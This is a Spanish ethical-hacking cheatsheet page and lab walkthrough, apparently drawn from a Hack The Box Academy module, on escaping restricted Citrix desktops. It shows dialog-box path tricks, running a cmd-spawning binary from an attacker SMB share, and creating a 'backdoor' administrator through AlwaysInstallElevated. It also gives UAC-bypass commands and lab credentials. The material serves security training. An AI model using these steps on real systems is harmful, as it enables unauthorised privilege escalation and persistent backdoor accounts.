
# Entornos restrictivos - Citrix

## <mark style="color:purple;">Citrix Breakout</mark>

Numerosas organizaciones aprovechan plataformas de virtualización como Terminal Services, Citrix, AWS AppStream, CyberArk PSM y Kiosk para ofrecer soluciones de acceso remoto con el fin de satisfacer sus necesidades comerciales. Sin embargo, en la mayoría de las organizaciones se implementan medidas de "bloqueo" en sus entornos de escritorio para minimizar el posible impacto de miembros del personal malintencionados y cuentas comprometidas en la seguridad general del dominio. Si bien estas restricciones de escritorio pueden obstaculizar a los actores de amenazas, existe la posibilidad de que "escapen" del entorno restringido.

***

## Metodología básica para el breakout

1. Obtener acceso a un `Dialog Box`.
2. Utilizar el cuadro de diálogo para lograr `command execution`.
3. `Escalar privilegios` para obtener mayores niveles de acceso.

En ciertos entornos, donde se implementan medidas de protección mínimas, puede incluso haber un acceso directo estándar a `cmd.exe` en el menú Inicio, lo que podría facilitar el acceso no autorizado. Sin embargo, en un entorno `lock-down` altamente restrictivo, cualquier intento de localizar "`cmd.exe`" o "`powershell.exe`" en el menú Inicio no arrojará resultados. De manera similar, acceder `C:\Windows\system32` a través del Explorador de archivos generará un error, lo que impedirá el acceso directo a utilidades críticas del sistema. Obtener acceso al "Símbolo del sistema/CMD" en un entorno tan restringido representa un logro notable, ya que proporciona un amplio control sobre el sistema operativo. Este nivel de control permite a un atacante recopilar información valiosa, lo que facilita una mayor escalada de privilegios.

Existen muchas técnicas que se pueden utilizar para salir de un entorno Citrix. Esta sección no cubrirá todos los escenarios posibles, pero analizaremos las formas más comunes de realizar una fuga de Citrix.

***

## <mark style="color:purple;">Evitar restricciones de ruta</mark>

Cuando intentamos visitar `C:\Users` en el Explorador de archivos, descubrimos que está restringido y se produce un error. Esto indica que se ha implementado una política de grupo para restringir que los usuarios exploren directorios en la unidad `C:\` mediante el Explorador de archivos. En tales situaciones, es posible utilizar cuadros de diálogo de Windows como un medio para eludir las restricciones impuestas por la política de grupo. Una vez que se obtiene un cuadro de diálogo de Windows, el siguiente paso suele implicar navegar hasta una ruta de carpeta que contenga ejecutables nativos que ofrecen acceso interactivo a la consola (es decir, cmd.exe). Por lo general, tenemos la opción de ingresar directamente la ruta de la carpeta en el campo de nombre de archivo para obtener acceso al archivo.

![Imagen](https://academy.hackthebox.com/storage/modules/67/C_users_restricted.png)

Numerosas aplicaciones de escritorio implementadas a través de Citrix están equipadas con funcionalidades que les permiten interactuar con archivos en el sistema operativo. Funciones como Guardar, Guardar como, Abrir, Cargar, Explorar, Importar, Exportar, Ayuda, Buscar, Escanear e Imprimir, generalmente brindan a un atacante la oportunidad de invocar un cuadro de diálogo de Windows. Existen múltiples formas de abrir un cuadro de diálogo en Windows utilizando herramientas como Paint, Bloc de notas, Wordpad, etc. Trataremos el uso de este método `MS Paint` como ejemplo para esta sección.

Ejecute `Paint` desde el menú Inicio y haga clic en `File > Open` para abrir el cuadro de diálogo.

![Imagen](https://academy.hackthebox.com/storage/modules/67/paint.png)

Con el cuadro de diálogo de Windows abierto en Paint, podemos ingresar la ruta [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths)`\\127.0.0.1\c$\users\pmorgan` debajo del campo Nombre de archivo, con Tipo de archivo establecido en `All Files` y al presionar Enter obtenemos acceso al directorio deseado.

![Imagen](https://academy.hackthebox.com/storage/modules/67/paint_flag.png)

***

## <mark style="color:purple;">Acceder a un recurso compartido SMB desde un entorno restringido</mark>

Si se establecen restricciones, el Explorador de archivos no permite el acceso directo a los recursos compartidos SMB en la máquina del atacante ni al servidor Ubuntu que aloja el entorno Citrix. Sin embargo, al utilizar la ruta UNC dentro del cuadro de diálogo de Windows, es posible sortear esta limitación. Este enfoque se puede emplear para facilitar las transferencias de archivos desde una computadora diferente.

Inicie un servidor SMB desde la máquina Ubuntu usando el script de Impacket `smbserver.py`.

```shell-session
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

De regreso al entorno de Citrix, inicie la aplicación "Paint" a través del menú de inicio. Navegue hasta el menú "Archivo" y seleccione "Abrir", lo que hará que aparezca el cuadro de diálogo. Dentro de este cuadro de diálogo de Windows asociado con Paint, ingrese la ruta UNC `\\10.13.38.95\share` en el campo designado "Nombre de archivo". Asegúrese de que el parámetro Tipo de archivo esté configurado en "`Todos los archivos`". Al presionar la tecla "Enter", se logra ingresar al recurso compartido.

![Imagen](https://academy.hackthebox.com/storage/modules/67/paint_share.png)

Debido a la presencia de restricciones dentro del Explorador de archivos, la copia directa de archivos no es viable. Sin embargo, un enfoque alternativo implica ejecutar con `click derecho` los archivos ejecutables y luego ejecutarlos. Haga clic derecho en el binario `pwn.exe` y seleccione `Open`, lo que debería indicarnos que lo ejecutemos y se abrirá una consola cmd.

![Imagen](https://academy.hackthebox.com/storage/modules/67/pwn_cmd.png)

El ejecutable `pwn.exe` es un binario compilado personalizado desde un archivo `pwn.c` que, al ejecutarse, abre el cmd.

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

Luego podemos usar el acceso cmd obtenido para copiar archivos del recurso compartido SMB al directorio de escritorio de pmorgan.

![Imagen](https://academy.hackthebox.com/storage/modules/67/xcopy.png)

***

## <mark style="color:purple;">Explorador alternativo</mark>

En los casos en los que se imponen restricciones estrictas al Explorador de archivos, se pueden emplear editores de sistemas de archivos alternativos como `Q-Dir` o `Explorer++` como solución alternativa. Estas herramientas pueden eludir las restricciones de carpetas impuestas por la política de grupo, lo que permite a los usuarios navegar y acceder a archivos y directorios que, de otro modo, estarían restringidos dentro del entorno estándar del Explorador de archivos.

Vale la pena señalar que anteriormente el Explorador de archivos no podía copiar archivos desde el recurso compartido SMB debido a las restricciones existentes. Sin embargo, mediante el uso de `Explorer++`, la capacidad de copiar archivos desde la ubicación `\\10.13.38.95\share` al escritorio perteneciente al usuario `pmorgan` se ha realizado con éxito en la siguiente captura de pantalla.

![Imagen](https://academy.hackthebox.com/storage/modules/67/Explorer++.png)

[Explorer++](https://explorerplusplus.com/) es muy recomendable y se utiliza con frecuencia en estas situaciones debido a su velocidad, interfaz fácil de usar y portabilidad. Al ser una aplicación portátil, se puede ejecutar directamente sin necesidad de instalación, lo que la convierte en una opción conveniente para eludir las restricciones de carpetas establecidas por la política de grupo.

***

## <mark style="color:purple;">Editores de registro alternativos</mark>

![Imagen](https://academy.hackthebox.com/storage/modules/67/smallregistry.png)

De manera similar, cuando el Editor de Registro predeterminado está bloqueado por la política de grupo, se pueden emplear editores de Registro alternativos para eludir las restricciones de la política de grupo estándar. [Simpleregedit](https://sourceforge.net/projects/simpregedit/) , [Uberregedit](https://sourceforge.net/projects/uberregedit/) y [SmallRegistryEditor](https://sourceforge.net/projects/sre/) son ejemplos de este tipo de herramientas GUI que facilitan la edición del registro de Windows sin verse afectado por el bloqueo impuesto por la política de grupo. Estas herramientas ofrecen una solución práctica y eficaz para administrar la configuración del registro en entornos tan restringidos.

***

## <mark style="color:purple;">Modificar archivo de acceso directo existente</mark>

También se puede lograr acceso no autorizado a rutas de carpetas modificando los accesos directos de Windows existentes y configurando la ruta del ejecutable deseado en el campo `Target`.

Los siguientes pasos describen el proceso:

1. `Click derecho` en el acceso directo deseado.
2. Seleccionar `Propiedades`.&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/67/shortcut_1.png" alt=""><figcaption></figcaption></figure>

3. Dentro del campo `Target`, modifique la ruta a la carpeta a la que desea acceder. Nosotros apuntaremos a `C:\Windows\System32\cmd.exe` para ganar acceso a la terminal:

<figure><img src="https://academy.hackthebox.com/storage/modules/67/shortcut_2.png" alt=""><figcaption></figcaption></figure>

4. Ejecute el acceso directo y se ejecutará cmd:

<figure><img src="https://academy.hackthebox.com/storage/modules/67/shortcut_3.png" alt=""><figcaption></figcaption></figure>

En los casos en los que no se encuentra disponible un archivo de acceso directo existente, existen métodos alternativos a tener en cuenta. Una opción es transferir un archivo de acceso directo existente mediante un servidor SMB. Como alternativa, podemos crear un nuevo archivo de acceso directo mediante PowerShell, como se menciona en la sección [Interacción con usuarios](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/varias-tecnicas-de-escalada-en-windows/interaccion-con-usuarios.md) en la pestaña `Generando un archivo malicioso .lnk` . Estos enfoques brindan versatilidad para lograr nuestros objetivos al trabajar con archivos de acceso directo.

***

## <mark style="color:purple;">Ejecución de script</mark>

Cuando se configuran extensiones de script como `.bat`, `.vbs`, o `.ps` para que ejecuten automáticamente su código mediante sus respectivos intérpretes, se abre la posibilidad de que se elimine un script que pueda servir como consola interactiva o facilitar la descarga y el lanzamiento de varias aplicaciones de terceros, lo que da como resultado eludir las restricciones vigentes. Esta situación crea una posible vulnerabilidad de seguridad en la que actores maliciosos podrían explotar estas funciones para ejecutar acciones no autorizadas en el sistema.

1. Crea un nuevo archivo de texto y llámalo "`evil.bat`".
2. Abra "`evil.bat`" con un editor de texto como el Bloc de notas.
3. Introduzca el comando "`cmd`" en el archivo.&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/67/script_bat.png" alt=""><figcaption></figcaption></figure>

4. Guarde el archivo.

Al ejecutar el archivo "`evil.bat`", se abrirá una ventana del símbolo del sistema. Esto puede resultar útil para realizar diversas operaciones de línea de comandos.

***

## <mark style="color:purple;">Escalando privilegios</mark>

Una vez que se establece el acceso al CMD, es posible buscar vulnerabilidades en un sistema con mayor facilidad. Por ejemplo, también se pueden utilizar herramientas como [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) y [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) para identificar posibles problemas de seguridad y vulnerabilidades dentro del sistema operativo.

Al usar `PowerUp.ps1`, encontramos que la clave [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) está presente y configurada.

También podemos validar esto usando el Símbolo del sistema consultando las claves de registro correspondientes:

```powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

Una vez más, podemos hacer uso de PowerUp, utilizando su función `Write-UserAddMSI.` Esta función facilita la creación de un archivo `.msi` directamente en el escritorio.

```powershell
PS C:\Users\pmorgan\Desktop> Set-ExecutionPolicy Bypass -Scope Process
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

Ahora podemos ejecutar `UserAdd.msi` y crear un nuevo usuario `backdoor:T3st@123` en el grupo `Administrators`. Tenga en cuenta que si le asigna una contraseña que no cumpla con los criterios de complejidad de contraseña, se generará un error.

![Imagen](https://academy.hackthebox.com/storage/modules/67/useradd.png)

Regrese a CMD y ejecute `runas` para iniciar el símbolo del sistema como el usuario `backdoor` recién creado.

```cmd-session
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

***

## <mark style="color:purple;">Cómo eludir el UAC</mark>

Aunque el usuario recién creado `backdoor` sea miembro del grupo `Administrators`, el acceso al directorio `C:\users\Administrator` sigue siendo inviable debido a la presencia del User Account Control (UAC). El UAC es un mecanismo de seguridad implementado en Windows para proteger el sistema operativo de cambios no autorizados. Con el UAC, cada aplicación que requiera el token de acceso de administrador debe solicitar el consentimiento del usuario final.

```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Hay numerosos scripts [de omisión del UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) , diseñados para ayudar a eludir el mecanismo del UAC activo. Estos scripts ofrecen métodos para sortear las restricciones del UAC y obtener privilegios elevados.

```powershell
PS C:\Users\Public> Set-ExecutionPolicy Bypass -Scope Process
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

![Imagen](https://academy.hackthebox.com/storage/modules/67/bypass_uac.png)

Después de omitir correctamente el control de cuentas de usuario, se abrirá una nueva ventana de PowerShell con privilegios más altos y podemos confirmarlo utilizando el comando `whoami /all` o `whoami /priv`. Este comando proporciona una vista completa de los privilegios del usuario actual. Y ahora podemos acceder al directorio del administrador.

![Imagen](https://academy.hackthebox.com/storage/modules/67/flag.png)

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.205.244 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "htb-student" y contraseña "HTB_@cademy_stdnt!"
```

#### Conexión al entorno Citrix

Visita `http://humongousretail.com/remote/` en el host generado mediante la sesión RDP e inicie sesión con las credenciales proporcionadas a continuación. Después de iniciar sesión, haga clic en `Default Desktop` para obtener el archivo `launch.ica` de Citrix y conectarse al entorno restringido.

```citrixcredentials
Username: pmorgan
Password: Summer1Summer!
Domain: htb.local
```

<figure><img src="/files/Jm7mzN6IMYgLqmCoAVRn" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/CE0ICYiOGr0FuboH6SxS" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/MMuy5KaZOBTi9PIBqgRA" alt=""><figcaption></figcaption></figure>

### Pregunta 1

> Envíe la flag del usuario desde `C:\Users\pmorgan\Downloads`

#### Evitar restricciones de ruta desde Paint

Ejecutamos `Paint` desde el menú Inicio y hacemos clic en `File > Open` para abrir el cuadro de diálogo. Aquí ingresamos la ruta a analizar: `\\127.0.0.1\c$\users\pmorgan`

<figure><img src="/files/skm0Xv9fHkfAyYMGI9Ne" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/4kkptK3By4KZMB0IdFQb" alt=""><figcaption></figcaption></figure>

Pulsamos click derecho sobre la flag y seleccionamos `Open` para abrir el archivo:

<figure><img src="/files/uabEYWIWPfqWYRQdLhkv" alt=""><figcaption></figcaption></figure>

### Pregunta 2

> Envíe la flag del Administrador desde `C:\Users\Administrator\Desktop`

Siguiendo el ejemplo anterior vemos que no podemos acceder al directorio de Administrator:

<figure><img src="/files/3Y2KJM6N09z3T6B6t7Ca" alt=""><figcaption></figcaption></figure>

Vamos a ver como podemos ejecutar un CMD en este tipo de entornos restringidos.

#### Acceso a un recurso compartido

Tenemos las siguientes herramientas en el directorio /Tools:

```shell-session
root@ubuntu:/home/htb-student/Tools# ls
Bypass-UAC.ps1  Explorer++.exe  PowerUp.ps1  pwn.c  pwn.exe  smbserver.py
```

Nos hemos enviado desde Kali el ejecutable `smbserver.py`. Necesitamos ejecutar el siguiente comando como root para generar el recurso compartido:

```shell-session
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Nos conectamos de nuevo al entorno de Citrix para utilizar las herramientas. En el paint accedemos a la ruta `\10.13.38.95\share`

<figure><img src="/files/HwxrmCSzN1dBb4K8DrgS" alt=""><figcaption></figcaption></figure>

El ejecutable `pwn.exe` es un binario compilado personalizado desde un archivo `pwn.c` que, al ejecutarse, abre el cmd.

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

Hacemos click derecho en `pwn.exe` y se nos abre la terminal:

<figure><img src="/files/pZGVyLpcg7L1rjWrQZTp" alt=""><figcaption></figcaption></figure>

El explorador de archivos no podía copiar archivos desde el recurso compartido SMB debido a las restricciones existentes. Sin embargo, mediante el uso de `Explorer++`, podemos copiar archivos desde la ubicación `\\10.13.38.95\share` al escritorio del usuario `pmorgan`&#x20;

<figure><img src="/files/067fSdaCvN303B6gQHVB" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/VIUrKUG8A6OVCbX3nnoU" alt=""><figcaption></figcaption></figure>

Ya podemos ejecutar estas herramientas libremente. Para importar los módulos de `PowerUp.ps1` desde el CMD que nos proporciona pwn.exe solamente tenemos que ejecutar:

```
powershell
```

#### Ejecutar PowerUp

No podemos importar `PowerUp.ps1` ya que no podemos ejecutar scripts en la máquina:

<figure><img src="/files/2uR7OIRzXLpB0iJkc2KT" alt=""><figcaption></figcaption></figure>

#### Eludir ExecutionPolicy

```powershell
PS C:\Users\pmorgan\Desktop> Set-ExecutionPolicy Bypass -Scope Process
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

#### Crear usuario con UserAdd.msi

```powershell
PS C:\Users\pmorgan\Desktop> .\UserAdd.msi
```

<figure><img src="/files/TXtTsAhrOSPCRtqYPs7a" alt=""><figcaption></figcaption></figure>

Debemos poner una contraseña que cumpla con las políticas de la organización:

<figure><img src="/files/PHFi60es3wF7a3RChTJy" alt=""><figcaption></figcaption></figure>

Con eso ya se nos generaría el usuario backdoor dentro del grupo administrators.

#### Conseguir una shell como admin

```
C:\> runas /user:backdoor cmd

Enter the password for backdoor: password123!!!***
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

<figure><img src="/files/xnGnDcBMkFIgPNgQ6RBR" alt=""><figcaption></figcaption></figure>

Aunque hemos ganado una shell como admin aún no podemos acceder al escritorio del administrador para acceder a la flag:

<figure><img src="/files/JswxIuuu27PmmMc6mZ2A" alt=""><figcaption></figcaption></figure>

#### Omisión del UAC

Necesitamos copiar los scripts al directorio `C:/Users/Public` para poder acceder con este usuario.

<figure><img src="/files/EEuyKB4kIbfj15pcuhMr" alt=""><figcaption></figcaption></figure>

Ahora ejecutamos:

```powershell
PS C:\Users\Public> Set-ExecutionPolicy Bypass -Scope Process
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

<figure><img src="/files/jTahbdKfhuV3Us6DMctu" alt=""><figcaption></figcaption></figure>

#### Acceso a la flag de administrador

<figure><img src="/files/2M8Jiq52rUOki7ccWGxH" alt=""><figcaption></figcaption></figure>
